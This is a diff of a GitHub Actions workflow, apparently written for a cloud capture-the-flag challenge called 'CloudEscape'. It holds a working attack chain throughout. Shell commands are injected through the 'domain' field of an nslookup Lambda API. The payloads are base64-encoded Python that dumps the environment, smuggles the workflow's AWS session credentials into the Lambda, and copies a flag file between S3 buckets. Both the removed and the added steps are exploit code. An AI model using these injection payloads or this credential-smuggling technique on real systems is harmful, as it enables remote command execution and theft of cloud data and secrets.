@@ -1,4 +1,4 @@
-name: CloudEscape Stage 1 - Get Flag v6
+name: CloudEscape Stage 1 - Get Flag v7
 on:
   workflow_dispatch:
   push:
@@ -18,233 +18,115 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Step 1 - Diagnostic inject (what tools exist in Lambda?)
+      - name: ALL IN ONE - Inject complete script with error capture
+        continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          # Simple diagnostic: write tool availability to /tmp, then copy to platform bucket
-          # Using Lambda's own role
-          PAYLOAD=$(python3 -c "
-          import json
-          cmd = '''x; which python3 base64 curl /opt/bin/aws 2>&1 > /tmp/diag; echo \"---\" >> /tmp/diag; python3 --version >> /tmp/diag 2>&1; echo \"---\" >> /tmp/diag; ls /opt/bin/ >> /tmp/diag 2>&1; echo \"---\" >> /tmp/diag; env >> /tmp/diag 2>&1; python3 -c \"import boto3; print(boto3.__version__)\" >> /tmp/diag 2>&1'''
-          print(json.dumps({'domain': cmd}))
-          ")
-          
-          echo "=== Sending diagnostic ==="
-          echo "Payload: ${#PAYLOAD} bytes"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-          echo
-          sleep 10
-          
-          # Now retrieve /tmp/diag by having Lambda write it to S3
-          PAYLOAD2=$(python3 -c "
-          import json
-          cmd = 'x; python3 -c \"import boto3; c=boto3.client(\\\"s3\\\",region_name=\\\"us-east-1\\\"); c.put_object(Bucket=\\\"platform-bucket-009661764077-us-east-1\\\",Key=\\\"diag.txt\\\",Body=open(\\\"/tmp/diag\\\",\\\"rb\\\").read())\" 2>&1'
-          print(json.dumps({'domain': cmd}))
-          ")
-          
-          echo "=== Uploading diag to S3 ==="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD2"
-          echo
-          sleep 10
-          
-          echo "=== Reading diag from S3 ==="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/diag.txt - --region us-east-1 2>&1
-
-      - name: Step 2 - Simple boto3 single-quote injection (Lambda own role)
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # Use SINGLE QUOTES for Python code, DOUBLE QUOTES inside
-          # The Lambda does: subprocess.run('/opt/nslookup ' + domain, shell=True)
-          # So domain = x; python3 -c '...')
-          PAYLOAD=$(python3 -c "
-          import json
-          cmd = \"x; python3 -c 'import boto3; c=boto3.client(\"s3\",region_name=\"us-east-1\"); f=c.get_object(Bucket=\"codec4f26c862a321ef5\",Key=\"flag.txt\")[\"Body\"].read(); c.put_object(Bucket=\"platform-bucket-009661764077-us-east-1\",Key=\"flag.txt\",Body=f); print(\"OK\")' 2>&1\"
-          print(json.dumps({'domain': cmd}))
-          ")
-          
-          echo "=== Step 2: boto3 single-quote ==="
-          echo "Payload: ${#PAYLOAD} bytes"
-          echo "Payload: $PAYLOAD"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-          echo
-          sleep 12
-          
-          echo "=== Check platform bucket ==="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
-
-      - name: Step 3 - cicdRole creds (properly exported)
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # Encode creds
+          # Prepare creds
           export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
           export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
           export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
           
-          # Build payload with cicdRole creds - use Python to construct
-          PAYLOAD=$(python3 << 'PYEOF'
-          import json, os
-          a = os.environ['AKID_B64']
-          s = os.environ['SKID_B64']  
-          t = os.environ['TOKEN_B64']
-          
-          # Use single quotes for Python code, pass creds as env vars
-          cmd = f"x; export A={a} S={s} T={t}; python3 -c 'import os,base64,boto3; a=base64.b64decode(os.environ[\"A\"]).decode(); s=base64.b64decode(os.environ[\"S\"]).decode(); t=base64.b64decode(os.environ[\"T\"]).decode(); se=boto3.Session(aws_access_key_id=a,aws_secret_access_key=s,aws_session_token=t,region_name=\"us-east-1\"); c=se.client(\"s3\"); f=c.get_object(Bucket=\"codec4f26c862a321ef5\",Key=\"flag.txt\")[\"Body\"].read(); c.put_object(Bucket=\"platform-bucket-009661764077-us-east-1\",Key=\"flag.txt\",Body=f); print(\"OK\")' 2>&1"
-          
-          print(json.dumps({'domain': cmd}))
-          PYEOF
-          )
-          
-          echo "=== Step 3: cicdRole creds ==="
-          echo "Payload: ${#PAYLOAD} bytes"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-          echo
-          sleep 12
-          
-          echo "=== Check platform bucket ==="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          # Create the complete Python script that:
+          # 1. Tries S3 with Lambda's own role
+          # 2. Tries S3 with cicdRole creds
+          # 3. Writes flag to platform bucket
+          # 4. Writes all errors to platform bucket as error.txt
+          cat > /tmp/complete.py << 'PYEOF'
+          import os,base64,boto3,traceback,json,time
 
-      - name: Step 4 - cicdRole via /opt/bin/aws (simple copy)
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
-          export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
-          export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
-          
-          PAYLOAD=$(python3 << 'PYEOF'
-          import json, os
-          a = os.environ['AKID_B64']
-          s = os.environ['SKID_B64']
-          t = os.environ['TOKEN_B64']
-          
-          cmd = f"x; export AWS_ACCESS_KEY_ID=$(echo {a}|base64 -d) AWS_SECRET_ACCESS_KEY=$(echo {s}|base64 -d) AWS_SESSION_TOKEN=$(echo {t}|base64 -d) AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1 2>&1"
-          
-          print(json.dumps({'domain': cmd}))
-          PYEOF
-          )
-          
-          echo "=== Step 4: aws CLI with cicdRole ==="
-          echo "Payload: ${#PAYLOAD} bytes"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-          echo
-          sleep 12
-          
-          echo "=== Check platform bucket ==="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          results = {}
 
-      - name: Step 5 - base64 script approach (properly exported)
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
-          export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
-          export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
-          
-          # Create Python script, base64 encode it
-          cat > /tmp/gf.py << 'EOF'
-          import os,base64,boto3,traceback
+          # Test 1: Lambda own role - can we list S3?
           try:
-              a=base64.b64decode(os.environ['A']).decode()
-              s=base64.b64decode(os.environ['S']).decode()
-              t=base64.b64decode(os.environ['T']).decode()
-              se=boto3.Session(aws_access_key_id=a,aws_secret_access_key=s,aws_session_token=t,region_name='us-east-1')
-              c=se.client('s3')
-              f=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read()
-              c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)
-              c.put_object(Bucket='site781fe43f26b9eba3',Key='flag.txt',Body=f)
-              print('SUCCESS:'+f.decode())
+              c1 = boto3.client('s3', region_name='us-east-1')
+              r = c1.list_buckets()
+              results['own_list'] = [b['Name'] for b in r['Buckets']]
           except Exception as e:
-              print('ERR:'+str(e)[:200])
-              traceback.print_exc()
-          EOF
-          
-          export SCRIPT_B64=$(base64 -w0 /tmp/gf.py)
-          
-          PAYLOAD=$(python3 << 'PYEOF'
-          import json, os
-          a = os.environ['AKID_B64']
-          s = os.environ['SKID_B64']
-          t = os.environ['TOKEN_B64']
-          sc = os.environ['SCRIPT_B64']
-          
-          cmd = f"x; export A={a} S={s} T={t}; echo {sc}|base64 -d>/tmp/g.py; python3 /tmp/g.py 2>&1"
-          
-          print(json.dumps({'domain': cmd}))
-          PYEOF
-          )
-          
-          echo "=== Step 5: base64 script with cicdRole ==="
-          echo "Payload: ${#PAYLOAD} bytes"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-          echo
-          sleep 12
-          
-          echo "=== Check buckets ==="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
-          echo "---"
-          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
+              results['own_list_err'] = str(e)[:300]
 
-      - name: Step 6 - base64 script with Lambda own role (no cicdRole creds)
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          cat > /tmp/gf2.py << 'EOF'
-          import boto3,traceback
+          # Test 2: Lambda own role - can we get flag from codec bucket?
           try:
-              c=boto3.client('s3',region_name='us-east-1')
-              f=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read()
-              c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)
-              c.put_object(Bucket='site781fe43f26b9eba3',Key='flag.txt',Body=f)
-              print('SUCCESS:'+f.decode())
+              c1 = boto3.client('s3', region_name='us-east-1')
+              r = c1.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
+              flag = r['Body'].read()
+              results['own_flag'] = flag.decode().strip()
+              # Write to platform bucket
+              c1.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag.txt', Body=flag)
+              results['own_put'] = 'OK'
           except Exception as e:
-              # Write error to platform bucket so we can see it
+              results['own_flag_err'] = str(e)[:300]
+
+          # Test 3: cicdRole creds - can we get flag?
+          try:
+              a = base64.b64decode(os.environ['A']).decode()
+              s = base64.b64decode(os.environ['S']).decode()
+              t = base64.b64decode(os.environ['T']).decode()
+              se = boto3.Session(aws_access_key_id=a, aws_secret_access_key=s, aws_session_token=t, region_name='us-east-1')
+              c2 = se.client('s3')
+              r = c2.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
+              flag = r['Body'].read()
+              results['cicd_flag'] = flag.decode().strip()
+              # Write to platform bucket
+              c2.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag.txt', Body=flag)
+              results['cicd_put'] = 'OK'
+              # Also write to site bucket
+              c2.put_object(Bucket='site781fe43f26b9eba3', Key='flag.txt', Body=flag)
+              results['cicd_site'] = 'OK'
+          except Exception as e:
+              results['cicd_flag_err'] = str(e)[:300]
+
+          # Write results to platform bucket (using whichever client we have)
+          try: 
+              c1.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='results.json', Body=json.dumps(results).encode())
+          except:
               try:
-                  c2=boto3.client('s3',region_name='us-east-1')
-                  c2.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='error.txt',Body=str(e).encode())
-              except:
-                  pass
-              print('ERR:'+str(e)[:200])
-              traceback.print_exc()
-          EOF
+                  c2.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='results.json', Body=json.dumps(results).encode())
+              except Exception as e2:
+                  results['write_err'] = str(e2)[:300]
+
+          print(json.dumps(results))
+          PYEOF
+
+          export SCRIPT_B64=$(base64 -w0 /tmp/complete.py)
           
-          export SCRIPT_B64=$(base64 -w0 /tmp/gf2.py)
-          
+          # Build the complete payload in Python
           PAYLOAD=$(python3 << 'PYEOF'
           import json, os
+          a = os.environ['AKID_B64']
+          s = os.environ['SKID_B64']
+          t = os.environ['TOKEN_B64']
           sc = os.environ['SCRIPT_B64']
-          cmd = f"x; echo {sc}|base64 -d>/tmp/g.py; python3 /tmp/g.py 2>&1"
+          
+          cmd = f"x; export A={a} S={s} T={t}; echo {sc}|base64 -d>/tmp/c.py; python3 /tmp/c.py 2>&1"
+          
           print(json.dumps({'domain': cmd}))
           PYEOF
           )
           
-          echo "=== Step 6: base64 script Lambda own role ==="
+          echo "=== Sending complete script ==="
           echo "Payload: ${#PAYLOAD} bytes"
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
-          sleep 12
-          
-          echo "=== Check buckets ==="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          echo "Waiting 15s for Lambda timeout..."
+          sleep 15
 
-      - name: Final check
-        if: always()
+      - name: Check results
         run: |
           echo "===== Platform bucket ====="
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          
+          echo "===== Read results.json ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/results.json - --region us-east-1 2>&1
+          echo
+          
+          echo "===== Read flag.txt ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - --region us-east-1 2>&1
+          echo
+          
           echo "===== Site bucket ====="
           aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
           
-          echo "===== Read flag from platform ====="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - --region us-east-1 2>&1
-          echo
-          echo "===== Read diag ====="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/diag.txt - --region us-east-1 2>&1
-          echo
-          echo "===== Read error ====="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/error.txt - --region us-east-1 2>&1
-          echo
           echo "===== Read flag from site ====="
           aws s3 cp s3://site781fe43f26b9eba3/flag.txt - --region us-east-1 2>&1
